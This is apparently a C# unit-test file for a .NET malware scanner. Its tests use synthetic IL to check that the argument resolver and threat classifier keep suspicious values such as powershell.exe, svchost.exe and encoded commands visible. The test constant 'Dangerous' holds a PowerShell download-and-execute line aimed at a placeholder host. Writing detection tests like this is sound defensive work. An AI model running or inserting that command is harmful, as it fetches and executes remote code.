using FluentAssertions;
using MLVScan.Models.Rules.Helpers;
using MLVScan.Models;
using MLVScan.Services;
using MLVScan.Services.ThreatIntel;
using System.Text;
using Mono.Cecil;
using Mono.Cecil.Cil;
using Xunit;

namespace MLVScan.Core.Tests.Unit.Rules;

public class ResolverAlternativeTests
{
    private const string Dangerous = "Invoke-WebRequest https://example.invalid/payload | Invoke-Expression";

    [Theory]
    [InlineData("<ambiguous field> [Possible values: notepad.exe]", "svchost.exe")]
    [InlineData("<ambiguous field> [Possible values: svchost.exe.backup]", "")]
    [InlineData("<ambiguous field> [Possible values: <unknown>]", "")]
    public void FamilyMatching_RequiresSystemExecutableInTargetEvidence(string target, string arguments)
    {
        var findings = new List<ScanFinding>
        {
            new("Loader", "Detected dynamic assembly loading via Assembly.LoadFrom(string).", Severity.High)
                { RuleId = "AssemblyDynamicLoadRule", RiskScore = 60 },
            new("Launch", $"Target: {target}. Arguments: {arguments} [Evasion: CreateNoWindow=true, WindowStyle=Hidden]", Severity.High)
                { RuleId = "ProcessStartRule" }
        };
        new ThreatFamilyClassifier().Classify(findings, null).Should()
            .NotContain(match => match.VariantId == "dynamic-code-loader-hidden-system-process");
    }

    [Fact]
    public void FieldSearchBudget_RetainsNearbyWriteBeforeScanningUnrelatedMethods()
    {
        using var assembly = CreateAssembly(out var type);
        var noise = Method(type, "Unrelated", assembly.MainModule.TypeSystem.Void);
        for (var index = 0; index < 5000; index++) noise.Body.GetILProcessor().Emit(OpCodes.Nop);
        noise.Body.GetILProcessor().Emit(OpCodes.Ret);
        var field = new FieldDefinition("Target", FieldAttributes.Static, assembly.MainModule.TypeSystem.String);
        type.Fields.Add(field);
        var caller = Method(type, "Run", assembly.MainModule.TypeSystem.Void);
        var il = caller.Body.GetILProcessor();
        il.Emit(OpCodes.Ldstr, "svchost.exe");
        il.Emit(OpCodes.Stsfld, field);
        il.Emit(OpCodes.Ldsfld, field);
        ResolveArgument(caller).Should().Contain("svchost.exe").And.Contain("budget exhausted");
    }

    [Fact]
    public void Replacement_CannotRewriteAlternativeDiagnosticsIntoSafeTarget()
    {
        using var assembly = CreateAssembly(out var type);
        var helper = Choice(type, "ffmpeg.exe", "powershell.exe");
        var caller = Method(type, "Run", assembly.MainModule.TypeSystem.Void);
        var il = caller.Body.GetILProcessor();
        il.Emit(OpCodes.Ldc_I4_0);
        il.Emit(OpCodes.Call, helper);
        il.Emit(OpCodes.Ldstr, "<ambiguous return> [Possible values: ffmpeg.exe | powershell.exe]");
        il.Emit(OpCodes.Ldstr, "ffmpeg.exe");
        il.Emit(OpCodes.Callvirt, assembly.MainModule.ImportReference(typeof(string).GetMethod("Replace", [typeof(string), typeof(string)])!));
        ResolveArgument(caller).Should().Contain("powershell.exe").And.Contain("ambiguous");
    }

    [Fact]
    public void EncodedAlternatives_BudgetCountsRecoveredSourceText()
    {
        using var assembly = CreateAssembly(out var type);
        var module = assembly.MainModule;
        var helper = Method(type, "Bytes", module.ImportReference(typeof(byte[])));
        var il = helper.Body.GetILProcessor();
        foreach (var character in new[] { 'a', 'b' })
        {
            il.Emit(OpCodes.Call, module.ImportReference(typeof(Encoding).GetProperty("Unicode")!.GetMethod!));
            il.Emit(OpCodes.Ldstr, new string(character, 5000));
            il.Emit(OpCodes.Callvirt, module.ImportReference(typeof(Encoding).GetMethod("GetBytes", [typeof(string)])!));
            il.Emit(OpCodes.Ret);
        }
        var caller = Method(type, "Run", module.TypeSystem.Void);
        caller.Body.GetILProcessor().Emit(OpCodes.Call, helper);
        caller.Body.GetILProcessor().Emit(OpCodes.Call, module.ImportReference(typeof(Convert).GetMethod("ToBase64String", [typeof(byte[])])!));
        var result = ResolveArgument(caller);
        result.Length.Should().BeLessThan(9000);
        result.Should().Contain("unknown").And.Contain(new string('a', 100));
    }

    [Fact]
    public void TooManyReturns_RetainCollectedEvidenceAndMarkTruncation()
    {
        using var assembly = CreateAssembly(out var type);
        var helper = Method(type, "Many", assembly.MainModule.TypeSystem.String);
        var il = helper.Body.GetILProcessor();
        for (var index = 0; index < 40; index++)
        {
            il.Emit(OpCodes.Ldstr, index == 0 ? Dangerous : "value" + index);
            il.Emit(OpCodes.Ret);
        }
        var caller = Method(type, "Run", assembly.MainModule.TypeSystem.Void);
        caller.Body.GetILProcessor().Emit(OpCodes.Call, helper);
        ResolveArgument(caller).Should().Contain(Dangerous).And.Contain("exceed recovery budget");
    }

    [Fact]
    public void PossiblePowerShellTarget_DoesNotInheritSafeToolClassification()
    {
        using var assembly = CreateAssembly(out var type);
        var helper = Choice(type, "ffmpeg.exe", "powershell.exe");
        var caller = Method(type, "Run", assembly.MainModule.TypeSystem.Void);
        caller.Body.GetILProcessor().Emit(OpCodes.Ldc_I4_0);
        caller.Body.GetILProcessor().Emit(OpCodes.Call, helper);
        ResolveArgument(caller).Should().Contain("powershell.exe");
        using var stream = new MemoryStream();
        assembly.Write(stream);
        stream.Position = 0;
        new AssemblyScanner(RuleFactory.CreateDefaultRules()).Scan(stream, "Alternatives.dll")
            .Should().Contain(f => f.RuleId == "ProcessStartRule" && f.Severity >= Severity.High &&
                                  f.Description.Contains("powershell.exe") && f.Description.Contains("ffmpeg.exe"));
    }

    [Fact]
    public void EncodedFieldAlternatives_AreDecodedSeparately()
    {
        using var assembly = CreateAssembly(out var type);
        var field = new FieldDefinition("Command", FieldAttributes.Static, assembly.MainModule.TypeSystem.String);
        type.Fields.Add(field);
        foreach (var text in new[] { "Write-Output hello", Dangerous })
        {
            var setter = Method(type, "Set" + type.Methods.Count, assembly.MainModule.TypeSystem.Void);
            var il = setter.Body.GetILProcessor();
            il.Emit(OpCodes.Ldstr, Convert.ToBase64String(Encoding.Unicode.GetBytes(text)));
            il.Emit(OpCodes.Stsfld, field);
            il.Emit(OpCodes.Ret);
        }
        var caller = Method(type, "Run", assembly.MainModule.TypeSystem.Void);
        var body = caller.Body.GetILProcessor();
        body.Emit(OpCodes.Call, assembly.MainModule.ImportReference(typeof(Encoding).GetProperty("Unicode")!.GetMethod!));
        body.Emit(OpCodes.Ldsfld, field);
        body.Emit(OpCodes.Call, assembly.MainModule.ImportReference(typeof(Convert).GetMethod("FromBase64String", [typeof(string)])!));
        body.Emit(OpCodes.Callvirt, assembly.MainModule.ImportReference(typeof(Encoding).GetMethod("GetString", [typeof(byte[])])!));
        ResolveArgument(caller).Should().Contain(Dangerous).And.Contain("Write-Output hello").And.Contain("ambiguous");
    }

    [Fact]
    public void IdenticalHelperReturns_RemainConcrete()
    {
        using var assembly = CreateAssembly(out var type);
        var helper = Choice(type, "same.exe", "same.exe");
        var caller = Method(type, "Run", assembly.MainModule.TypeSystem.Void);
        caller.Body.GetILProcessor().Emit(OpCodes.Ldc_I4_0);
        caller.Body.GetILProcessor().Emit(OpCodes.Call, helper);
        ResolveArgument(caller).Should().Be("same.exe");
    }

    [Fact]
    public void UnknownReturn_IsNotDroppedInFavorOfKnownReturn()
    {
        using var assembly = CreateAssembly(out var type);
        var helper = Choice(type, "safe.exe", "ignored");
        helper.Parameters.Add(new ParameterDefinition(assembly.MainModule.TypeSystem.String));
        var instructions = helper.Body.Instructions;
        instructions[^2].OpCode = OpCodes.Ldarg_1;
        instructions[^2].Operand = null;
        var caller = Method(type, "Run", assembly.MainModule.TypeSystem.Void);
        caller.Parameters.Add(new ParameterDefinition(assembly.MainModule.TypeSystem.String));
        caller.Body.GetILProcessor().Emit(OpCodes.Ldc_I4_0);
        caller.Body.GetILProcessor().Emit(OpCodes.Ldarg_0);
        caller.Body.GetILProcessor().Emit(OpCodes.Call, helper);
        ResolveArgument(caller).Should().Contain("safe.exe").And.Contain("<arg 0>").And.Contain("ambiguous");
    }

    private static MethodDefinition Choice(TypeDefinition type, string first, string second)
    {
        var helper = Method(type, "Choose", type.Module.TypeSystem.String);
        helper.Parameters.Add(new ParameterDefinition(type.Module.TypeSystem.Boolean));
        var il = helper.Body.GetILProcessor();
        var other = Instruction.Create(OpCodes.Ldstr, second);
        il.Emit(OpCodes.Ldarg_0);
        il.Emit(OpCodes.Brfalse, other);
        il.Emit(OpCodes.Ldstr, first);
        il.Emit(OpCodes.Ret);
        il.Append(other);
        il.Emit(OpCodes.Ret);
        return helper;
    }

    [Theory]
    [InlineData(false)]
    [InlineData(true)]
    public void HelperReturns_PreserveBothOrders(bool reverse)
    {
        using var assembly = CreateAssembly(out var type);
        var helper = Method(type, "Choose", assembly.MainModule.TypeSystem.String);
        helper.Parameters.Add(new ParameterDefinition(assembly.MainModule.TypeSystem.Boolean));
        var il = helper.Body.GetILProcessor();
        var second = Instruction.Create(OpCodes.Ldstr, reverse ? "benign.exe" : Dangerous);
        il.Emit(OpCodes.Ldarg_0);
        il.Emit(OpCodes.Brfalse, second);
        il.Emit(OpCodes.Ldstr, reverse ? Dangerous : "benign.exe");
        il.Emit(OpCodes.Ret);
        il.Append(second);
        il.Emit(OpCodes.Ret);
        var caller = Method(type, "Run", assembly.MainModule.TypeSystem.Void);
        caller.Body.GetILProcessor().Emit(OpCodes.Ldc_I4_0);
        caller.Body.GetILProcessor().Emit(OpCodes.Call, helper);
        ResolveArgument(caller).Should().Contain(Dangerous).And.Contain("benign.exe").And.Contain("ambiguous");
    }

    [Theory]
    [InlineData(false)]
    [InlineData(true)]
    public void MutableFields_PreserveWritesAcrossMethodsAndInstances(bool isStatic)
    {
        using var assembly = CreateAssembly(out var type);
        var field = new FieldDefinition("Command", FieldAttributes.Public | (isStatic ? FieldAttributes.Static : 0), assembly.MainModule.TypeSystem.String);
        type.Fields.Add(field);
        foreach (var text in new[] { Dangerous, "benign.exe" })
        {
            var setter = Method(type, "Set" + type.Methods.Count, assembly.MainModule.TypeSystem.Void);
            var il = setter.Body.GetILProcessor();
            if (!isStatic) { setter.Parameters.Add(new ParameterDefinition(type)); il.Emit(OpCodes.Ldarg_0); }
            il.Emit(OpCodes.Ldstr, text);
            il.Emit(isStatic ? OpCodes.Stsfld : OpCodes.Stfld, field);
            il.Emit(OpCodes.Ret);
        }
        var caller = Method(type, "Run", assembly.MainModule.TypeSystem.Void);
        var body = caller.Body.GetILProcessor();
        if (!isStatic) { caller.Parameters.Add(new ParameterDefinition(type)); body.Emit(OpCodes.Ldarg_0); }
        body.Emit(OpCodes.Ldstr, "benign.exe");
        body.Emit(isStatic ? OpCodes.Stsfld : OpCodes.Stfld, field);
        if (!isStatic) body.Emit(OpCodes.Ldarg_0);
        body.Emit(isStatic ? OpCodes.Ldsfld : OpCodes.Ldfld, field);
        ResolveArgument(caller).Should().Contain(Dangerous).And.Contain("benign.exe").And.Contain("ambiguous");
    }

    private static string ResolveArgument(MethodDefinition caller)
    {
        var sink = caller.Module.ImportReference(typeof(System.Diagnostics.Process).GetMethod("Start", [typeof(string)])!);
        var index = caller.Body.Instructions.Count;
        var il = caller.Body.GetILProcessor();
        il.Emit(OpCodes.Call, sink);
        il.Emit(OpCodes.Pop);
        il.Emit(OpCodes.Ret);
        InstructionValueResolver.TryResolveCallArgumentDisplay(caller, sink, caller.Body.Instructions, index, 0, out var value).Should().BeTrue();
        return value;
    }

    private static AssemblyDefinition CreateAssembly(out TypeDefinition type)
    {
        var assembly = AssemblyDefinition.CreateAssembly(new AssemblyNameDefinition("Alternatives", new Version(1, 0)), "Alternatives", ModuleKind.Dll);
        type = new TypeDefinition("Fixture", "Commands", TypeAttributes.Public, assembly.MainModule.TypeSystem.Object);
        assembly.MainModule.Types.Add(type);
        return assembly;
    }

    private static MethodDefinition Method(TypeDefinition type, string name, TypeReference result)
    {
        var method = new MethodDefinition(name, MethodAttributes.Public | MethodAttributes.Static, result);
        type.Methods.Add(method);
        return method;
    }
}
